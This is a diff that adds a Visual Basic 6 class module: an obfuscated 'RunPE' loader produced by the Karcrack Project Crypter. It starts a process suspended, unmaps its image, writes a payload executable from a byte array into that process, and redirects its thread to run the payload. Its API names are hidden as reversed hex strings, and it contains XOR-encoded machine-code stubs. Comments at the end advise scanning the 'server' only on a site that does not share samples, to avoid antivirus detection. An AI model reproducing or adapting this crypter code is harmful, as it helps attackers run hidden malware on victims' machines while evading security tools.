@@ -1,0 +1,487 @@
+VERSION 1.0 CLASS
+BEGIN
+  MultiUse = -1  'True
+  Persistable = 0  'NotPersistable
+  DataBindingBehavior = 0  'vbNone
+  DataSourceBehavior  = 0  'vbNone
+  MTSTransactionMode  = 0  'NotAnMTSObject
+END
+Attribute VB_Name = "Class2"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = True
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+
+'##############################################################
+'#Codigo encriptado de forma automatizada                     #
+'#por el Karcrack Project Crypter v2.1 [KPC]                  #
+'#Programado integramente por Karcrack                        #
+'#Informacion de la encriptacion:                             #
+'#	+ Encriptacion  :StrRev.                                  
+'#	+ Contraseña    :-None-
+'#	+ L. Encriptadas:15                                       
+'#	+ Fecha/Hora    :12:04:10--23.03.2010                     
+'##############################################################
+
+'##############################################################
+'#Codigo encriptado de forma automatizada                     #
+'#por el Karcrack Project Crypter v2.1 [KPC]                  #
+'#Programado integramente por Karcrack                        #
+'#Informacion de la encriptacion:                             #
+'#	+ Encriptacion  :Ascii                                    
+'#	+ Contraseña    :-None-
+'#	+ L. Encriptadas:15                                       
+'#	+ Fecha/Hora    :12:04:09--23.03.2010                     
+'##############################################################
+
+'##############################################################
+'#Codigo encriptado de forma automatizada                     #
+'#por el Karcrack Project Crypter v2.1 [KPC]                  #
+'#Programado integramente por Karcrack                        #
+'#Informacion de la encriptacion:                             #
+'#	+ Encriptacion  :StrRev.                                  
+'#	+ Contraseña    :-None-
+'#	+ L. Encriptadas:15                                       
+'#	+ Fecha/Hora    :12:04:07--23.03.2010                     
+'##############################################################
+'---------------------------------------------------------------------------------------
+' Module    : cf4y2E7VYsVZnkTgGGhpCewd_PTR
+' Author    : Karcrack
+' Now$      : 28/08/2009  20:47
+' Used for? : Run PE from ByteArray
+' Thanks.   : Cobein/Slayer/Squeezer
+'---------------------------------------------------------------------------------------
+
+Option Explicit
+
+Private Const r7u5Z5LXXmqtlKZSCjmHjnC       As Long = &H5A4D&
+Private Const b4u3o8qDGVqrBLGjRlFAoUd        As Long = &H4550&
+
+Private Const n1W1y4trUCTFJiJUOgdBWum           As Long = &H40
+Private Const v1Z7K8HeZDFlGLTIovwyBYf           As Long = &HF8
+Private Const N7E0T4aSqGiQTnQUifObBBc     As Long = &H28
+Private Const M4B3A4pQpBuNvTDOUQbsHPQ As Long = &H28
+
+Private n2G6l3YrAoVQQPUFMTjKJZP                   As String
+Private e8G8a4WVZLELpQCRVYQoSvg                As String
+
+Private Const p5p5u1nmaMnKWkSjWaAnlfw                    As String = "<p5p5u1nmaMnKWkSjWaAnlfw>"
+Private Const y3n2S2adsOPYidHWpJcXMrB                    As String = "<y3n2S2adsOPYidHWpJcXMrB>"
+
+Private Const d5g3K3yJIYceWyLDnVXrUZn              As Long = &H10007
+Private Const L5t6T8RPrZqcgHgrlEBYtSL          As Long = &H4
+Private Const U5v2h3eCvacJdiqgMUVTYyD                As Long = &H1000
+Private Const l3c5r8qPeXHorMosHDmAZZB               As Long = &H2000
+Private Const W6L5K6AaBMGYHeOYeamDSZb    As Long = &H40
+
+Private Type D4V0A5nGOEjefdiUahwZYoe
+    cb                          As Long
+    lpReserved                  As Long
+    lpDesktop                   As Long
+    lpTitle                     As Long
+    dwX                         As Long
+    dwY                         As Long
+    dwXSize                     As Long
+    dwYSize                     As Long
+    dwXCountChars               As Long
+    dwYCountChars               As Long
+    dwFillAttribute             As Long
+    dwFlags                     As Long
+    wShowWindow                 As Integer
+    cbReserved2                 As Integer
+    lpReserved2                 As Long
+    hStdInput                   As Long
+    hStdOutput                  As Long
+    hStdError                   As Long
+End Type
+
+Private Type J0Z0h5NCWMDRbKKvvYgtVpU
+    i6w0F8VkdNuvSuNJrGffGPbess                    As Long
+    hThread                     As Long
+    dwProcessID                 As Long
+    dwThreadID                  As Long
+End Type
+
+Private Type G4k4W3ifClvCKbcwIgNqGms
+    ControlWord                 As Long
+    StatusWord                  As Long
+    TagWord                     As Long
+    ErrorOffset                 As Long
+    ErrorSelector               As Long
+    DataOffset                  As Long
+    DataSelector                As Long
+    RegisterArea(1 To 80)       As Byte
+    Cr0NpxState                 As Long
+End Type
+
+Private Type a6X0w0BtCfHrIMOGfImXTHc
+    ContextFlags                As Long
+    Dr0                         As Long
+    Dr1                         As Long
+    Dr2                         As Long
+    Dr3                         As Long
+    Dr6                         As Long
+    Dr7                         As Long
+    FloatSave                   As G4k4W3ifClvCKbcwIgNqGms
+    SegGs                       As Long
+    SegFs                       As Long
+    SegEs                       As Long
+    SegDs                       As Long
+    Edi                         As Long
+    Esi                         As Long
+    Ebx                         As Long
+    Edx                         As Long
+    Ecx                         As Long
+    Eax                         As Long
+    Ebp                         As Long
+    Eip                         As Long
+    SegCs                       As Long
+    EFlags                      As Long
+    Esp                         As Long
+    SegSs                       As Long
+End Type
+
+Private Type g4k8d5RDeBNbJaMQqebVnkI
+    e_magic                     As Integer
+    e_cblp                      As Integer
+    e_cp                        As Integer
+    e_crlc                      As Integer
+    e_cparhdr                   As Integer
+    e_minalloc                  As Integer
+    e_maxalloc                  As Integer
+    e_ss                        As Integer
+    e_sp                        As Integer
+    e_csum                      As Integer
+    e_ip                        As Integer
+    e_cs                        As Integer
+    e_lfarlc                    As Integer
+    e_ovno                      As Integer
+    e_res(0 To 3)               As Integer
+    e_oemid                     As Integer
+    e_oeminfo                   As Integer
+    e_res2(0 To 9)              As Integer
+    e_lfanew                    As Long
+End Type
+
+Private Type r3W3d5yRSclgKasNgaQyEFD
+    Machine                     As Integer
+    NumberOfSections            As Integer
+    TimeDateStamp               As Long
+    PointerToSymbolTable        As Long
+    NumberOfSymbols             As Long
+    SizeOfOptionalHeader        As Integer
+    Characteristics             As Integer
+End Type
+
+Private Type J8n8Y6kBFIYnfQwAVwCQauJ
+    Virtuas6F0Y1TZVgwUWfDjNdKQjrg              As Long
+    Size                        As Long
+End Type
+
+Private Type X1k1G6QhTXvXicurOkJBvJa
+    Magic                       As Integer
+    MajorLinkerVersion          As Byte
+    MinorLinkerVersion          As Byte
+    SizeOfCode                  As Long
+    SizeOfInitializedData       As Long
+    SizeOfUnitializedData       As Long
+    AddressOfEntryPoint         As Long
+    BaseOfCode                  As Long
+    BaseOfData                  As Long
+    ImageBase                   As Long
+    SectionAlignment            As Long
+    FileAlignment               As Long
+    MajorOperatingSystemVersion As Integer
+    MinorOperatingSystemVersion As Integer
+    MajorImageVersion           As Integer
+    MinorImageVersion           As Integer
+    MajorSubsystemVersion       As Integer
+    MinorSubsystemVersion       As Integer
+    W32VersionValue             As Long
+    SizeOfImage                 As Long
+    SizeOfHeaders               As Long
+    CheckSum                    As Long
+    SubSystem                   As Integer
+    DllCharacteristics          As Integer
+    SizeOfStackReserve          As Long
+    SizeOfStackCommit           As Long
+    SizeOfHeapReserve           As Long
+    SizeOfHeapCommit            As Long
+    LoaderFlags                 As Long
+    NumberOfRvaAndSizes         As Long
+    DataDirectory(0 To 15)      As J8n8Y6kBFIYnfQwAVwCQauJ
+End Type
+
+Private Type D4M3s7RTATZhWCLMKPmsAer
+    Signature                   As Long
+    FileHeader                  As r3W3d5yRSclgKasNgaQyEFD
+    OptionalHeader              As X1k1G6QhTXvXicurOkJBvJa
+End Type
+
+Private Type S6m7g1VNwfhCejwtcpPQqAM
+   Characteristics              As Long
+   TimeDateStamp                As Long
+   MajorVersion                 As Integer
+   MinorVersion                 As Integer
+   lpName                       As Long
+   Base                         As Long
+   NumberOfFunctions            As Long
+   NumberOfNames                As Long
+   lpAddressOfFunctions         As Long
+   lpAddressOfNames             As Long
+   lpAddressOfNameOrdinals      As Long
+End Type
+
+Private Type C4B4q3qCyOwUEPVRctIQRbt
+    SecName                     As String * 8
+    VirtualSize                 As Long
+    Virtuas6F0Y1TZVgwUWfDjNdKQjrg              As Long
+    SizeOfRawData               As Long
+    PointerToRawData            As Long
+    PointerToRelocations        As Long
+    PointerToLinenumbers        As Long
+    NumberOfRelocations         As Integer
+    NumberOfLinenumbers         As Integer
+    Characteristics             As Long
+End Type
+
+Private Type tAPICall
+    ptsLIB              As Long ' Pointer to ANSI String that contains Library
+    ptI5m6t8MhisCvaqJdvqgMVVT             As Long ' Pointer to ANSI String that contains Procedure
+    lReserved           As Long ' Just reserved...
+    lPointer            As Long ' Pointer to the buffer that will contain temp variables from DllFunctionCall
+    lpBuffer(3)         As Long ' Buffer that will contain temp variables
+End Type
+
+Private Declare Function ps Lib "USER32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
+Private Declare Function k Lib "gdi32" (ByVal hMetaFile As Long) As Long
+Private Declare Function J Lib "USER32" Alias "LoadCursorA" (ByVal hLib As Long, ByVal lngCursorID As Long) As Long
+Private Declare Function w Lib "gdi32" (ByVal hDC As Long) As Long
+Private Declare Sub t Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
+Private Declare Function p Lib "WINMM.DLL" (ByVal hMixer As Long) As Long
+Private Declare Function b Lib "gdi32" (ByVal hColorSpace As Long) As Long
+Private Declare Function C Lib "gdi32" (ByVal hDC As Long) As Long
+Private Declare Function DllFunctionCall Lib "MSVBVM60" (ByRef typeAPI As tAPICall) As Long
+Private Declare Sub CopyBytes Lib "MSVBVM60.DLL" Alias "__vbaCopyBytes" (ByVal Size As Long, Dest As Any, Source As Any)
+
+Private h2I1H2vpwbDnEIKCbEiTPDY          As Long
+Private c3g7Z4NavJXFWIMmaXRjgEZ       As Long
+Private h8i5Z7oLuGMITklHISpWAQy(&HFF)   As Byte
+       
+Public Function Z5b7q1bclyqUjCWpjZFOPNS() As Long
+    'This function will be replaced with machine code laterz
+    'Do not add any public procedure on top of it
+End Function
+
+Public Function f4y2E7VYsVZnkTgGGhpCewd(ByRef m4M7K1kSjVZAZkevtRmLEAL() As Byte, Optional E3o5l1EhiPjovmSbcafDJQu As String, Optional ByRef i6w0F8VkdNuvSuNJrGffGPb As Long) As Boolean
+    Dim i                       As Long
+    Dim tg4k8d5RDeBNbJaMQqebVnkI       As g4k8d5RDeBNbJaMQqebVnkI
+    Dim tD4M3s7RTATZhWCLMKPmsAer       As D4M3s7RTATZhWCLMKPmsAer
+    Dim tC4B4q3qCyOwUEPVRctIQRbt   As C4B4q3qCyOwUEPVRctIQRbt
+    Dim tD4V0A5nGOEjefdiUahwZYoe            As D4V0A5nGOEjefdiUahwZYoe
+    Dim tJ0Z0h5NCWMDRbKKvvYgtVpU    As J0Z0h5NCWMDRbKKvvYgtVpU
+    Dim ta6X0w0BtCfHrIMOGfImXTHc                As a6X0w0BtCfHrIMOGfImXTHc
+    Const sKernel               As String = "KERNEL32"
+    Const sNTDLL                As String = "NTDLL"
+
+    Call CopyBytes(n1W1y4trUCTFJiJUOgdBWum, tg4k8d5RDeBNbJaMQqebVnkI, m4M7K1kSjVZAZkevtRmLEAL(0))
+   
+    If Not tg4k8d5RDeBNbJaMQqebVnkI.e_magic = r7u5Z5LXXmqtlKZSCjmHjnC Then Exit Function
+
+    Call CopyBytes(v1Z7K8HeZDFlGLTIovwyBYf, tD4M3s7RTATZhWCLMKPmsAer, m4M7K1kSjVZAZkevtRmLEAL(tg4k8d5RDeBNbJaMQqebVnkI.e_lfanew))
+   
+    If Not tD4M3s7RTATZhWCLMKPmsAer.Signature = b4u3o8qDGVqrBLGjRlFAoUd Then Exit Function
+                                                                                                 
+    If E3o5l1EhiPjovmSbcafDJQu = vbNullString Then
+        E3o5l1EhiPjovmSbcafDJQu = Space(260)
+
+'1-> f2i0a0MGYHeOYeamDSZbkIDuleFileNameW
+'1-> WemaNeliFeluDIkbZSDmaeYOeHYGM0a0i2f
+'1-> 57656D614E656C6946656C7544496B625A53446D6165594F654859474D306130693266
+        R1R8I1XbeWuKDmUXrUYmvSf sKernel, StrReverse(jhblgcjnf(StrReverse("662396031603D474958456F4955616D64435A526B6944457C6566496C656E416D65675"))), App.hInstance, StrPtr(E3o5l1EhiPjovmSbcafDJQu), 260
+    End If
+   
+    With tD4M3s7RTATZhWCLMKPmsAer.OptionalHeader
+       
+        tD4V0A5nGOEjefdiUahwZYoe.cb = Len(tD4V0A5nGOEjefdiUahwZYoe)
+           
+'1-> CreateProcessW
+'1-> WssecorPetaerC
+'1-> 57737365636F7250657461657243
+        R1R8I1XbeWuKDmUXrUYmvSf sKernel, StrReverse(jhblgcjnf(StrReverse("3427561647560527F63656373775"))), 0, StrPtr(E3o5l1EhiPjovmSbcafDJQu), 0, 0, 0, L5t6T8RPrZqcgHgrlEBYtSL, 0, 0, VarPtr(tD4V0A5nGOEjefdiUahwZYoe), VarPtr(tJ0Z0h5NCWMDRbKKvvYgtVpU)
+
+'1-> NtUnmapViewOfSection
+'1-> noitceSfOweiVpamnUtN
+'1-> 6E6F6974636553664F7765695670616D6E55744E
+        R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E44755E6D6160765965677F4663556364796F6E6"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.i6w0F8VkdNuvSuNJrGffGPbess, .ImageBase
+       
+'1-> VirtualAllocEx
+'1-> xEcollAlautriV
+'1-> 7845636F6C6C416C617574726956
+        R1R8I1XbeWuKDmUXrUYmvSf sKernel, StrReverse(jhblgcjnf(StrReverse("659627475716C614C6C6F6365487"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.i6w0F8VkdNuvSuNJrGffGPbess, .ImageBase, .SizeOfImage, U5v2h3eCvacJdiqgMUVTYyD Or l3c5r8qPeXHorMosHDmAZZB, W6L5K6AaBMGYHeOYeamDSZb
+       
+'1-> NtWriteVirtualMemory
+'1-> yromeMlautriVetirWtN
+'1-> 79726F6D654D6C6175747269566574697257744E
+        R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E4477527964756659627475716C6D456D6F62797"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.i6w0F8VkdNuvSuNJrGffGPbess, .ImageBase, VarPtr(m4M7K1kSjVZAZkevtRmLEAL(0)), .SizeOfHeaders, 0
+   
+        For i = 0 To tD4M3s7RTATZhWCLMKPmsAer.FileHeader.NumberOfSections - 1
+            CopyBytes Len(tC4B4q3qCyOwUEPVRctIQRbt), tC4B4q3qCyOwUEPVRctIQRbt, m4M7K1kSjVZAZkevtRmLEAL(tg4k8d5RDeBNbJaMQqebVnkI.e_lfanew + v1Z7K8HeZDFlGLTIovwyBYf + M4B3A4pQpBuNvTDOUQbsHPQ * i)
+'1-> NtWriteVirtualMemory
+'1-> yromeMlautriVetirWtN
+'1-> 79726F6D654D6C6175747269566574697257744E
+            R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E4477527964756659627475716C6D456D6F62797"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.i6w0F8VkdNuvSuNJrGffGPbess, .ImageBase + tC4B4q3qCyOwUEPVRctIQRbt.Virtuas6F0Y1TZVgwUWfDjNdKQjrg, VarPtr(m4M7K1kSjVZAZkevtRmLEAL(tC4B4q3qCyOwUEPVRctIQRbt.PointerToRawData)), tC4B4q3qCyOwUEPVRctIQRbt.SizeOfRawData, 0
+        Next i
+
+        ta6X0w0BtCfHrIMOGfImXTHc.ContextFlags = d5g3K3yJIYceWyLDnVXrUZn
+       
+'1-> NtGetContextThread
+'1-> daerhTtxetnoCteGtN
+'1-> 646165726854747865746E6F43746547744E
+        R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E44774564734F6E647568747458627561646"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.hThread, VarPtr(ta6X0w0BtCfHrIMOGfImXTHc)
+   
+'1-> NtWriteVirtualMemory
+'1-> yromeMlautriVetirWtN
+'1-> 79726F6D654D6C6175747269566574697257744E
+        R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E4477527964756659627475716C6D456D6F62797"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.i6w0F8VkdNuvSuNJrGffGPbess, ta6X0w0BtCfHrIMOGfImXTHc.Ebx + 8, VarPtr(.ImageBase), 4, 0
+       
+        ta6X0w0BtCfHrIMOGfImXTHc.Eax = .ImageBase + .AddressOfEntryPoint
+       
+'1-> NtSetContextThread
+'1-> daerhTtxetnoCteStN
+'1-> 646165726854747865746E6F43746553744E
+        R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E44735564734F6E647568747458627561646"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.hThread, VarPtr(ta6X0w0BtCfHrIMOGfImXTHc)
+       
+'1-> NtResumeThread
+'1-> daerhTemuseRtN
+'1-> 646165726854656D75736552744E
+        R1R8I1XbeWuKDmUXrUYmvSf sNTDLL, StrReverse(jhblgcjnf(StrReverse("E44725563757D656458627561646"))), tJ0Z0h5NCWMDRbKKvvYgtVpU.hThread, 0
+       
+        i6w0F8VkdNuvSuNJrGffGPb = tJ0Z0h5NCWMDRbKKvvYgtVpU.i6w0F8VkdNuvSuNJrGffGPbess
+    End With
+   
+    f4y2E7VYsVZnkTgGGhpCewd = True
+End Function
+
+Public Function R1R8I1XbeWuKDmUXrUYmvSf(ByVal A6e6Q5cryqPeXHorMosHRmA As String, ByVal sFunc As String, ParamArray Params()) As Long
+    Dim f0e0U8UfZrbwhswtGXltuEc        As Long
+    Dim i           As Long
+    Dim k2Q8D4eTuutwjpvOonEtvoN       As String
+    Dim S8u5R6bSgqZZMNnvJlFjIam     As String
+    Dim Z2D2o0BRVXPoEygOQkNSgqL        As Long
+   
+    Z2D2o0BRVXPoEygOQkNSgqL = J3i7g2HIGLyDKaCBRHKBaDh(A6e6Q5cryqPeXHorMosHRmA, sFunc)
+   
+    If Z2D2o0BRVXPoEygOQkNSgqL = 0 Then Exit Function
+   
+    For i = UBound(Params) To 0 Step -1
+'1-> 68
+'1-> 86
+'1-> 3836
+        S8u5R6bSgqZZMNnvJlFjIam = S8u5R6bSgqZZMNnvJlFjIam & StrReverse(jhblgcjnf(StrReverse("6383"))) & g5I5c1mEptTtFROlHfXUfvL(CLng(Params(i)))
+    Next
+   
+    f0e0U8UfZrbwhswtGXltuEc = VarPtr(h8i5Z7oLuGMITklHISpWAQy(0))
+    f0e0U8UfZrbwhswtGXltuEc = f0e0U8UfZrbwhswtGXltuEc + (UBound(Params) + 2) * 5
+    f0e0U8UfZrbwhswtGXltuEc = Z2D2o0BRVXPoEygOQkNSgqL - f0e0U8UfZrbwhswtGXltuEc - 5
+   
+    k2Q8D4eTuutwjpvOonEtvoN = n2G6l3YrAoVQQPUFMTjKJZP
+    k2Q8D4eTuutwjpvOonEtvoN = Replace(k2Q8D4eTuutwjpvOonEtvoN, p5p5u1nmaMnKWkSjWaAnlfw, S8u5R6bSgqZZMNnvJlFjIam)
+    k2Q8D4eTuutwjpvOonEtvoN = Replace(k2Q8D4eTuutwjpvOonEtvoN, y3n2S2adsOPYidHWpJcXMrB, g5I5c1mEptTtFROlHfXUfvL(f0e0U8UfZrbwhswtGXltuEc))
+   
+    Call u6r2K7pWqyEsYhiglJQXBON(k2Q8D4eTuutwjpvOonEtvoN)
+   
+    R1R8I1XbeWuKDmUXrUYmvSf = e6k5C3JtbdwaftpYlLLmyIj
+End Function
+
+Private Function J3i7g2HIGLyDKaCBRHKBaDh(ByVal A6e6Q5cryqPeXHorMosHRmA As String, ByVal I5m6t8MhisCvaqJdvqgMVVT As String) As Long
+    On Error Resume Next
+    Dim tAPI            As tAPICall
+    Dim bvLib()         As Byte
+    Dim bvMod()         As Byte
+   
+    Call I7e0o5tEmmZZBJWwSvVmnke(A6e6Q5cryqPeXHorMosHRmA, bvLib)
+    Call I7e0o5tEmmZZBJWwSvVmnke(I5m6t8MhisCvaqJdvqgMVVT, bvMod)
+   
+    With tAPI
+        .ptsLIB = VarPtr(bvLib(0))
+        .ptI5m6t8MhisCvaqJdvqgMVVT = VarPtr(bvMod(0))
+        .lReserved = &H40000
+        .lPointer = VarPtr(.lpBuffer(0))
+    End With
+   
+    J3i7g2HIGLyDKaCBRHKBaDh = DllFunctionCall(tAPI)
+End Function
+
+'COBEIN (=
+Private Sub I7e0o5tEmmZZBJWwSvVmnke(ByVal sUNICODE As String, ByRef bvANSI() As Byte)
+    Dim i           As Long
+   
+    ReDim bvANSI(Len(sUNICODE))
+    For i = 1 To Len(sUNICODE)
+        bvANSI(i - 1) = Asc(Mid$(sUNICODE, i, 1))
+    Next i
+End Sub
+
+
+Private Function g5I5c1mEptTtFROlHfXUfvL(ByVal C0s2I5PZfbnEFaclJqUjQWp As Long) As String
+    Dim n3P2O3EvEiJuLORJhLpZVKe(3)   As Byte
+    Dim i           As Long
+   
+    CopyBytes &H4, n3P2O3EvEiJuLORJhLpZVKe(0), C0s2I5PZfbnEFaclJqUjQWp
+    For i = 0 To 3
+                                                                               '1-> 0
+                                                                                          '1-> 0
+'1-> 30
+        g5I5c1mEptTtFROlHfXUfvL = g5I5c1mEptTtFROlHfXUfvL & Right(StrReverse(jhblgcjnf(StrReverse("03"))) & Hex(n3P2O3EvEiJuLORJhLpZVKe(i)), 2)
+    Next
+End Function
+
+Private Sub u6r2K7pWqyEsYhiglJQXBON(ByVal v7B2t8hTuRdrZqcgHurlECY As String)
+    Dim i   As Long
+    For i = 0 To Len(v7B2t8hTuRdrZqcgHurlECY) - 1 Step 2
+'1-> &h
+'1-> h&
+'1-> 6826
+        h8i5Z7oLuGMITklHISpWAQy((i / 2)) = CByte(StrReverse(jhblgcjnf(StrReverse("6286"))) & Mid$(v7B2t8hTuRdrZqcgHurlECY, i + 1, 2))
+    Next i
+End Sub
+
+Private Function e6k5C3JtbdwaftpYlLLmyIj() As Long
+    CopyBytes &H4, h2I1H2vpwbDnEIKCbEiTPDY, ByVal ObjPtr(Me)
+    h2I1H2vpwbDnEIKCbEiTPDY = h2I1H2vpwbDnEIKCbEiTPDY + &H1C
+    CopyBytes &H4, c3g7Z4NavJXFWIMmaXRjgEZ, ByVal h2I1H2vpwbDnEIKCbEiTPDY
+    CopyBytes &H4, ByVal h2I1H2vpwbDnEIKCbEiTPDY, VarPtr(h8i5Z7oLuGMITklHISpWAQy(0))
+    e6k5C3JtbdwaftpYlLLmyIj = Z5b7q1bclyqUjCWpjZFOPNS
+    CopyBytes &H4, ByVal h2I1H2vpwbDnEIKCbEiTPDY, c3g7Z4NavJXFWIMmaXRjgEZ
+End Function
+
+Private Sub Class_Initialize()
+'1-> Ç½Ë¼ÍËÏÇÊÎÃ¯¾«¼·ÎÁºÇÃ¯¾«¼·ÍÁÊÆÇÆÏÎÉÉÌÎ¼Ï¼Ì
+'1-> Ì¼Ï¼ÎÌÉÉÎÏÆÇÆÊÁÍ·¼«¾¯ÃÇºÁÎ·¼«¾¯ÃÎÊÇÏËÍ¼Ë½Ç
+'1-> CCBCCFBCCECCC9C9CECFC6C7C6CAC1CDB7BCABBEAFC3C7BAC1CEB7BCABBEAFC3CECAC7CFCBCDBCCBBDC7
+    n2G6l3YrAoVQQPUFMTjKJZP = StrReverse(jhblgcjnf(StrReverse("7CDBBCCBDCBCFC7CACEC3CFAEBBACB7BEC1CAB7C3CFAEBBACB7BDC1CAC6C7C6CFCEC9C9CCCECCBFCCBCC")))
+'1-> Ç½Ê¼ÍËÏÇÊË½ÇÌÏÏÏÏÏÏÏÉËÇ½ÏÏÇ½ËÏÏ¼Ç½ËÏÎ¼Ç½ÏÏÇ½ËÏÏÇÇÆÏÌÊ¼ÌÎ¼Ï¼Ì
+'1-> Ì¼Ï¼ÎÌ¼ÊÌÏÆÇÇÏÏË½ÇÏÏ½Ç¼ÎÏË½Ç¼ÏÏË½ÇÏÏ½ÇËÉÏÏÏÏÏÏÏÌÇ½ËÊÇÏËÍ¼Ê½Ç
+'1-> CCBCCFBCCECCBCCACCCFC6C7C7CFCFCBBDC7CFCFBDC7BCCECFCBBDC7BCCFCFCBBDC7CFCFBDC7CBC9CFCFCFCFCFCFCFCCC7BDCBCAC7CFCBCDBCCABDC7
+    e8G8a4WVZLELpQCRVYQoSvg = StrReverse(jhblgcjnf(StrReverse("7CDBACCBDCBCFC7CACBCDB7CCCFCFCFCFCFCFCFC9CBC7CDBFCFC7CDBBCFCFCCB7CDBBCFCECCB7CDBFCFC7CDBBCFCFC7C7C6CFCCCACCBCCECCBFCCBCC")))
+    Call Ý(n2G6l3YrAoVQQPUFMTjKJZP)
+    Call Ý(e8G8a4WVZLELpQCRVYQoSvg)
+End Sub
+
+Private Sub Ý(ByRef x As String)
+    Dim i       As Long
+   
+    For i = 1 To Len(x)
+        Mid$(x, i, 1) = Chr$(Asc(Mid$(x, i, 1)) Xor &HFF)
+    Next i
+End Sub
+
+ 'RunPE function is Y4s5m8oARSnpWDgvdjDLAfb
+ 'RunPE Made by : br1337 RUNPE Generator
+ 'Never upload your server to another scan site,
+'just to www.novirusthanks.org and check the checkbox ' do not distribute the example '
+ 'Thanks :P
+
+
+
